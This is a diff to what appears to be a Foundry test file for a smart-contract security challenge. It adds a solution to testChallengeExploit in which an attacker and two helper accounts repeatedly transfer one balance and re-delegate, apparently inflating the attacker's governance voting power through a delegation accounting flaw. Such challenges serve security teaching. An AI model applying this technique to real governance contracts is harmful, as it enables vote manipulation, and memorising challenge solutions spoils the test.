@@ -50,8 +50,33 @@ contract Testing is Test {
     /// solves the challenge
     function testChallengeExploit() public {
         /// for this exploit, you can use vm.prank(..) w/ {attacker,o1,o2}
+        uint256 attackerBalance = governanceToken.balanceOf(attacker);
 
-        // implement solution here
+        vm.startPrank(attacker);
+        governanceToken.delegate({delegatee: attacker});
+        governanceToken.transfer({to: o1, amount: attackerBalance});
+        vm.stopPrank();
+
+        vm.startPrank(o1);
+        governanceToken.delegate({delegatee: attacker});
+        governanceToken.transfer({to: o2, amount: attackerBalance});
+        governanceToken.delegate({delegatee: address(0)});
+        vm.stopPrank();
+
+        vm.startPrank(o2);
+        governanceToken.delegate({delegatee: attacker});
+        governanceToken.transfer({to: o1, amount: attackerBalance});
+        governanceToken.delegate({delegatee: address(0)});
+        vm.stopPrank();
+
+        vm.startPrank(o1);
+        governanceToken.delegate({delegatee: attacker});
+        governanceToken.transfer({to: o2, amount: attackerBalance});
+        vm.stopPrank();
+
+        vm.startPrank(o2);
+        governanceToken.delegate({delegatee: attacker});
+        vm.stopPrank();
 
         validation();
     }
